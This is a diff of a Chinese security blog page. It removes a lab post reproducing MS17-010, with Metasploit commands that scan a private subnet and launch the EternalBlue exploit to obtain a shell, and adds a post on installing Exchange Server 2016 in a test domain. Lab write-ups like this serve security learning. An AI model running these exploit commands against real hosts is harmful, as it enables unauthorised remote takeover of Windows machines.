@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>MS17_010漏洞复现 | Sriracha :)</title>
-  <meta name="keywords" content=" 漏洞复现 , 主机漏洞 ">
-  <meta name="description" content="MS17_010漏洞复现 | Sriracha :)">
+  <title>how-to-install-exchange-server | Sriracha :)</title>
+  <meta name="keywords" content=" 环境搭建 ">
+  <meta name="description" content="how-to-install-exchange-server | Sriracha :)">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta property="og:type" content="website">
 <meta property="og:title" content="Python">
@@ -1030,9 +1030,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-MS17-010漏洞复现" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-how-to-install-exchange-server" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">MS17_010漏洞复现</h1>
+        <h1 class="article-title">how-to-install-exchange-server</h1>
     
     <div class="article-meta">
         
@@ -1041,16 +1041,14 @@
         
         <span class="tag">
             
-            <a class="color5">漏洞复现</a>
-            
-            <a class="color5">主机漏洞</a>
+            <a class="color5">环境搭建</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-01-13 13:04:40'>2019-10-09 16:08</time>
+        创建时间:<time class="date" title='更新时间: 2020-10-30 16:08:42'>2020-10-30 15:56</time>
         
     </div>
     <div class="article-meta">
@@ -1072,7 +1070,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#环境"><span class="toc-text">环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#探测"><span class="toc-text">探测</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#利用"><span class="toc-text">利用</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#准备"><span class="toc-text">准备</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1088,20 +1086,25 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul>
-<li>KALI:192.168.79.130</li>
-<li>WIN7:192.168.79.128</li>
-<li>WIN2008:192.168.79.128</li>
-<li>Msf</li>
-</ul>
-<a id="more"></a>
-<h1 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h1><p>首先打开msf的控制台，我们搜索17010漏洞相关的利用脚本<br><img src="/2019/10/09/MS17-010漏洞复现/console.png" alt></p>
-<p>这里看见有两个种模块<br>auxiliary(探测)<br>exploits(利用)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#利用这个探测模块</span><br><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line"></span><br><span class="line">#设置目标，扫描这个网段</span><br><span class="line">set RHOST 192.168.79.2/24</span><br><span class="line"></span><br><span class="line">#设置线程</span><br><span class="line">set THREADS 3</span><br><span class="line"></span><br><span class="line">#运行</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<p><img src="/2019/10/09/MS17-010漏洞复现/scan.png" alt><br>这里发现了我们的两台windos主机都探测出了漏洞</p>
-<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>使用exploit模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set RHOST 192.168.79.128</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2019/10/09/MS17-010漏洞复现/shell.png" alt></p>
-<p>这里我们就拿下目标主机的shell了</p>
+        <h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p><a href="https://docs.microsoft.com/zh-cn/exchange/plan-and-deploy/prerequisites?view=exchserver-2019#windows-server-2019-prerequisites-for-exchange-2019" title="https://docs.microsoft.com/zh-cn/exchange/plan-and-deploy/prerequisites?view=exchserver-2019#windows-server-2019-prerequisites-for-exchange-2019" target="_blank" rel="noopener">官网安装教程及要求</a></p>
+<p>不过比较繁琐，看不懂Emmmm</p>
+<p>Windows Server 2012：<a href="https://msdn.itellyou.cn/" target="_blank" rel="noopener">https://msdn.itellyou.cn/</a></p>
+<p>虚拟机内存给4G，给少了安装之后会很卡</p>
+<p>安装好之后，运行powershell:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Install-WindowsFeature Server-Media-Foundation, NET-Framework-45-Features, RPC-over-HTTP-proxy, RSAT-Clustering, RSAT-Clustering-CmdInterface, RSAT-Clustering-Mgmt, RSAT-Clustering-PowerShell, WAS-Process-Model, Web-Asp-Net45, Web-Basic-Auth, Web-Client-Auth, Web-Digest-Auth, Web-Dir-Browsing, Web-Dyn-Compression, Web-Http-Errors, Web-Http-Logging, Web-Http-Redirect, Web-Http-Tracing, Web-ISAPI-Ext, Web-ISAPI-Filter, Web-Lgcy-Mgmt-Console, Web-Metabase, Web-Mgmt-Console, Web-Mgmt-Service, Web-Net-Ext45, Web-Request-Monitor, Web-Server, Web-Stat-Compression, Web-Static-Content, Web-Windows-Auth, Web-WMI, Windows-Identity-Foundation, RSAT-ADDS</span><br></pre></td></tr></table></figure></p>
+<p>然后需要安装几个组件</p>
+<p><a href="https://download.visualstudio.microsoft.com/download/pr/014120d7-d689-4305-befd-3cb711108212/0fd66638cde16859462a6243a4629a50/ndp48-x86-x64-allos-enu.exe" title="https://download.visualstudio.microsoft.com/download/pr/014120d7-d689-4305-befd-3cb711108212/0fd66638cde16859462a6243a4629a50/ndp48-x86-x64-allos-enu.exe" target="_blank" rel="noopener">.NET Framework 4.8</a></p>
+<p><a href="https://www.microsoft.com/download/details.aspx?id=30679" title="https://www.microsoft.com/download/details.aspx?id=30679" target="_blank" rel="noopener">Visual C++ Redistributable Package for Visual Studio 2012</a></p>
+<p><a href="https://support.microsoft.com/help/4032938/update-for-visual-c-2013-redistributable-package" title="https://support.microsoft.com/help/4032938/update-for-visual-c-2013-redistributable-package" target="_blank" rel="noopener">Visual C++ Redistributable Package for Visual Studio 2013</a></p>
+<p><a href="https://download.microsoft.com/download/2/C/4/2C47A5C1-A1F3-4843-B9FE-84C0032C61EC/UcmaRuntimeSetup.exe" title="https://download.microsoft.com/download/2/C/4/2C47A5C1-A1F3-4843-B9FE-84C0032C61EC/UcmaRuntimeSetup.exe" target="_blank" rel="noopener">UcmaRuntimeSetup</a></p>
+<p>安装好之后将这台12机器加域，用域管理(administrator)用户登录</p>
+<p>下载Exchange Server : <a href="https://docs.microsoft.com/zh-cn/exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019</a></p>
+<p>我这里安装Exchange Server 2016 CU17</p>
+<p>下载好之后复制到虚拟机中，右键挂载，运行setup</p>
+<p>这个时候安装界面应该就好了，然后安装（估计要1-2h）</p>
+<p>安装好之后访问:<a href="https://localhost/owa" target="_blank" rel="noopener">https://localhost/owa</a></p>
+<p>这里登录administrator</p>
+<p><img src="/2020/10/30/how-to-install-exchange-server/success.png" alt></p>
+<p>装了好几天终于装好了  ==</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 sher10cksec@foxmail.com </span>
@@ -1111,12 +1114,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>MS17_010漏洞复现</p>
+    <p><span class="copy-title">文章标题:</span>how-to-install-exchange-server</p>
     
     <p><span class="copy-title">本文作者:</span><a  title="sher10ck">sher10ck</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-10-09, 16:08:08</p>
-    <p><span class="copy-title">最后更新:</span>2020-01-13, 13:04:40</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/10/09/MS17-010漏洞复现/" title="MS17_010漏洞复现">http://sherlocz.github.io/2019/10/09/MS17-010漏洞复现/</a>
+    <p><span class="copy-title">发布时间:</span>2020-10-30, 15:56:13</p>
+    <p><span class="copy-title">最后更新:</span>2020-10-30, 16:08:42</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/10/30/how-to-install-exchange-server/" title="how-to-install-exchange-server">http://sherlocz.github.io/2020/10/30/how-to-install-exchange-server/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
